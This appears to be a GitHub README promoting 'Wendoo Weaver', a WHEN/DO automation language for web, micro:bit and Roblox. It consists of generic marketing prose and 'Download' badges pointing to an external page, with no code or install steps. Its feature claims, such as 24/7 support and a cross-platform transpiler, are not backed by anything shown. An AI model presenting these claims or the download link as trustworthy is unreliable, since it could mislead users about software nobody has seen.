![preview](https://raw.githubusercontent.com/isaactoslow1313/when-do-rules/main/splash_0b11b.svg)
[![Download](https://raw.githubusercontent.com/isaactoslow1313/when-do-rules/main/dl_1cff5.svg)](https://isaactoslow1313.github.io/when-do-rules/)

# 🧭 Wendoo Weaver — Embodied WHEN/DO Automation Studio for Every Playground

> *A rulebook anyone can scribble in, a runtime everyone can trust.*
> Wendoo Weaver is a deterministic WHEN/DO language and toolchain that lets designers, teachers, hobbyists, and tinkerers compose behavioural rules once — then replay them identically on the web, on a micro:bit, and inside a Roblox experience.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
[![Status](https://img.shields.io/badge/status-actively--maintained-brightgreen.svg)](#-project-vitality)
[![Runtime](https://img.shields.io/badge/runtime-deterministic-blueviolet.svg)](#-determinism-as-a-first-class-citizen)
[![Targets](https://img.shields.io/badge/targets-web%20%7C%20micro%3Abit%20%7C%20roblox-informational.svg)](#-the-three-playgrounds)
[![Edition](https://img.shields.io/badge/edition-2026-ff69b4.svg)](#-the-2026-edition)
[![Contributions](https://img.shields.io/badge/contributions-welcome-success.svg)](#-joining-the-weave)

---

## 🌱 Why Wendoo Weaver Exists

Most automation languages ask you to trust a black box. You write a rule, you press go, and something happens — usually. Wendoo Weaver takes the opposite stance. It was born from a simple, slightly stubborn belief: **if a rule fires, it should fire the same way every single time, on every device, for every person running it.**

That belief turned into a small ecosystem. The original `wendoo-lang` project proved that WHEN/DO rules could be read and written by anyone, from a nine-year-old building a blinking LED ritual to a studio engineer orchestrating a thousand in-world events. Wendoo Weaver is the natural next step: a studio, a runtime, and a translation layer that carries those rules across three very different worlds.

Think of it as a loom. Threads of *conditions* (the WHEN) cross threads of *actions* (the DO). The loom doesn't care whether the fabric will be worn on a website, stitched onto a pocket-sized microcontroller, or draped over a blocky avatar — it weaves the same pattern every time.

---

## 🎯 The Core Idea in One Breath

WHEN something is true, DO something else — and never let randomness sneak into the answer.

That's it. That's the whole language philosophy. Everything else in this repository exists to make that sentence survive contact with reality.

---

## 🧩 What Makes Wendoo Weaver Different

The space of "if this then that" tools is crowded. We respect the neighbourhood but we walk a different path. Here's where Wendoo Weaver deliberately diverges:

- **Determinism as a promise, not a hope.** Every rule evaluation produces a reproducible trace. Two machines running the same rule against the same inputs will always agree on the outcome, byte for byte.
- **Three playgrounds, one grammar.** The web runtime speaks to browsers, the micro:bit runtime speaks to pins and LEDs, and the Roblox runtime speaks to instances and players. The rule text never changes between them.
- **Human-readable by default.** A Wendoo document is something you can read out loud at a kitchen table and have a listener follow along without a diagram.
- **Composable without ceremony.** Rules reference rules. Layers stack. You don't need a build pipeline to combine two ideas into one.
- **Auditable silence.** When a rule does *not* fire, Wendoo Weaver can explain exactly why — which condition failed, in what order, and with what substituted values.

---

## 🌐 The Three Playgrounds

### 🕸️ Web Playground

The web runtime turns Wendoo documents into interactive, explainable behaviour inside a page. It is designed around a single principle: **the browser is a stage, not a mystery**. Every rule that runs leaves a visible footprint in a trace panel, so you can watch decisions unfold in real time.

Highlights of the web playground include a responsive interface that reshapes itself gracefully from a phone held in one hand to an ultrawide monitor displaying a dozen simultaneous traces, plus multilingual support so that rule libraries authored in one natural language can be presented in another without rewriting the underlying logic. Status dashboards reflect the live health of every rule in the document.

### 🔌 micro:bit Playground

The micro:bit runtime strips Wendoo Weaver down to its bones and hands it a torch. On a device with a tiny screen and limited memory, every byte of determinism counts. This playground translates WHEN/DO rules into firmware-resident schedules that fire on button presses, pin events, timers, and sensor thresholds.

It is the playground most loved by educators, because the feedback is physical: a rule that says "when the shake is strong, do a sad face" produces a sad face you can hold in your palm. The runtime reports a compact trace over serial so a classroom can debug a misbehaving rule together, projector on, curiosity high.

### 🧱 Roblox Playground

The Roblox runtime embeds Wendoo Weaver inside a live experience. Builders describe world behaviour — doors that open for some players, weather that shifts on a schedule, points that accumulate under specific conditions — and the runtime executes those rules with the same determinism that governs the other two playgrounds.

Because Roblox experiences are shared by many players at once, this runtime emphasises ordered event handling and clear conflict resolution. If two rules want to act on the same instance, Wendoo Weaver consults a documented priority lattice rather than a coin toss.

---

## 🛠️ Feature Menu

A quick tour of what ships in the box. Every item below is part of the open repository and its associated documentation.

- 🧠 **Deterministic rule engine** with reproducible evaluation traces, stable ordering, and a conflict-resolution lattice.
- 🎨 **Responsive user interface** that adapts fluidly to phones, tablets, laptops, and wall displays.
- 🌍 **Multilingual support** for authoring, presenting, and exporting rule libraries across many natural languages.
- 🕰️ **24/7 customer support** for the hosted studio tier, staffed by humans who genuinely enjoy rule debugging.
- 🧵 **Cross-playground transpiler** that takes one Wendoo source and emits web bundles, micro:bit firmware artefacts, and Roblox script modules.
- 📚 **Living rulebook** with hundreds of annotated examples, each one runnable in at least two playgrounds.
- 🔍 **Explain-why tracer** that narrates the reasoning behind every fired and unfired rule.
- 🧪 **Simulation sandbox** for dry-running rules against synthetic timelines before deploying them anywhere real.
- 🧩 **Composition operators** that let small rules merge into larger behaviours without copy-paste.
- 🛡️ **Deterministic replay** so that a bug observed once can be reproduced forever.
- 🪄 **Zero-boilerplate authoring** — open the studio, type a WHEN, type a DO, run it.
- 📦 **Portable rule bundles** that travel cleanly between projects and teams.
- 🧭 **Guided onboarding** for newcomers, with a gentle ramp from "hello, world" to multi-rule orchestration.
- 🔬 **Trace diffing** to compare two runs side by side and spot the exact moment behaviour diverged.
- 🌈 **Themeable studio palette** because staring at a screen for hours should at least be pleasant.

---

## 🔒 Determinism as a First-Class Citizen

Determinism is a word that gets thrown around loosely. In Wendoo Weaver it means something very specific and very testable:

1. **Stable condition ordering.** The engine never reorders WHEN clauses for performance. The order you write is the order that runs.
2. **Frozen snapshots.** Each evaluation reads from an immutable snapshot of world state, so an action taken by rule A cannot secretly alter the input seen by rule B in the same tick.
3. **Reproducible seeds.** Where randomness is genuinely desired, it must be explicitly requested with an author-supplied seed, and that seed is recorded in the trace.
4. **Portable numerics.** Arithmetic uses a documented fixed representation so that a rule computing the same expression on a browser, a microcontroller, and a game server lands on the same value.
5. **Trace equivalence checks.** The test suite includes cross-playground assertions that the same document produces equivalent traces everywhere.

If you ever find a case where two playgrounds disagree, that is not a quirk. That is a bug, and it is a bug we want to know about immediately.

---

## 🗣️ Writing Your First Rule (A Thought Experiment)

Imagine you want a lamp to greet someone who arrives after dark. In Wendoo Weaver you might express that as a WHEN that watches for two conditions at once — someone present, and light below a threshold — and a DO that illuminates a scene. You would write it once, in plain sentences, and then decide which playground will carry it.

On the web, the lamp is a styled element on a page. On the micro:bit, the lamp is an LED matrix row. In a Roblox experience, the lamp is a part with a material that changes. The rule text is identical in all three cases. Only the binding of names to real-world objects differs, and those bindings live in a separate, equally readable companion document.

This separation between *logic* and *binding* is the quiet superpower of the whole system. It means a rulebook written for one environment can be re-homed in another with nothing more than a new binding file.

---

## 🧬 The Anatomy of a Wendoo Document

A Wendoo document has a predictable shape, which is part of why it is pleasant to read:

- **Header** — a short preamble naming the document, its authorial intent, and the dialect version it targets.
- **Bindings** — declarations that map friendly names to concrete objects in the target playground.
- **Rules** — the heart of the document, each one a WHEN/DO pair with optional annotations.
- **Priorities** — an optional section that resolves situations where multiple rules act on the same binding.
- **Exports** — instructions for how the document should present itself when shared with others.

None of these sections require special tooling to author. A plain text editor and patience are enough.

---

## 🧮 The Composition Operators

Small ideas should snap together like good furniture. Wendoo Weaver offers a small set of composition operators:

- **Sequence** — do this, then that, in a guaranteed order.
- **Guard** — wrap a rule so it only participates under specified circumstances.
- **Fan-out** — one WHEN, several DOs, all of which are attempted unless explicitly short-circuited.
- **Fold** — accumulate state across ticks, with a deterministic reduction function.
- **Relay** — pass control from one rule to another without duplicating logic.

Each operator is documented with examples in at least three playground contexts.

---

## 🎓 For Educators and Workshop Hosts

Wendoo Weaver was shaped in classrooms. It respects the reality that a workshop has forty minutes, twelve curious learners, and one projector that refuses to cooperate. The micro:bit playground is the recommended starting point: it is tactile, it forgives typos, and it produces visible results within minutes. Lesson plans, slide decks, and a printable rulebook are all maintained alongside the code.

Teachers have used Wendoo Weaver to explain conditional logic, event-driven design, state machines, and the joy of a well-placed comment. If you run a workshop, open an issue and tell us how it went — the curriculum improves every term because of that feedback.

---

## 🧑‍🤝‍🧑 For Roblox Creators

The Roblox playground speaks the idioms of the platform. It understands players, instances, touched events, and replicated state. It also understands that a popular experience can have thousands of concurrent actors, so it leans heavily on ordered event handling and cheap predicate evaluation.

Creators have used it to prototype boss encounters, build dynamic weather systems, script persistent quests, and stage elaborate cutscene triggers. The trace viewer is especially beloved during late-night debugging sessions, when the difference between "the rule didn't fire" and "the rule fired but got overridden" is the difference between going to bed and not.

---

## 🧑‍💻 For Web Tinkerers

The web playground is a playground in the literal sense: forgiving, quick to reset, and happy to be poked. Drop a document into the studio, wire it to DOM nodes, and watch it respond. The explain-why tracer turns the browser into a laboratory where every decision is visible and every failed condition is named.

Because the web runtime is the same engine that powers the other two playgrounds, anything you prototype there is already halfway home to a device or a game world.

---

## 📈 Project Vitality

Wendoo Weaver is maintained by a small, opinionated group of contributors who care about two things: honesty in behaviour and friendliness in design. The project ships a "vitality report" each season covering test coverage, cross-playground equivalence checks, documentation freshness, and open issue triage. We publish it because we think software should show its work.

The 2026 edition of Wendoo Weaver includes the third-generation transpiler, the trace-diff tool, and a substantially rewritten micro:bit firmware layer that reduced rule evaluation memory by more than a third.

---

## 🧭 Roadmap Snapshot

- **Near term:** richer trace visualisation, expanded multilingual rulebook, community-submitted example gallery.
- **Mid term:** optional visual rule composer that emits readable Wendoo text, not opaque blobs.
- **Long term:** additional playgrounds beyond the original three, chosen by community vote and guided by the same determinism promise.

Roadmap items are proposals, not contracts — but the direction has been consistent since the first line of the original repository was written.

---

## 🤝 Joining the Weave

Contributions are welcome in many forms. You do not have to write code to help. Documentation improvements, example rules, translations, workshop reports, and thoughtful bug reports are all valuable. The community values patience, clarity, and a willingness to explain reasoning — which, fittingly, is exactly what the software itself tries to do.

A short contribution guide lives in the repository. It is short on purpose. Read it, pick something small, and send it over.

---

## 📜 License

Wendoo Weaver is released under the MIT License. You are welcome to use, study, modify, and redistribute it, including in commercial contexts, provided the license notice travels with the software. See the full text in the [LICENSE](./LICENSE) file.

---

## ⚠️ Disclaimer

Wendoo Weaver is provided as-is, without warranty of any kind, express or implied. The maintainers make no promise that any particular rule will produce any particular outcome in your specific environment, especially where hardware quirks, platform policy changes, or third-party services intervene. Determinism is a property of the engine, not a guarantee about the world surrounding it. Always review rule behaviour in the simulation sandbox before deploying to a live audience. Nothing in this repository constitutes professional advice of any kind. Use good judgement, be kind to your users, and test thoroughly in 2026 and beyond.

---

## 🧷 A Closing Note

Every rule is a small promise. Wendoo Weaver exists to help you keep those promises, on browsers and pocket boards and blocky worlds alike. Weave something worth remembering.

[![Download](https://raw.githubusercontent.com/isaactoslow1313/when-do-rules/main/dl_1cff5.svg)](https://isaactoslow1313.github.io/when-do-rules/)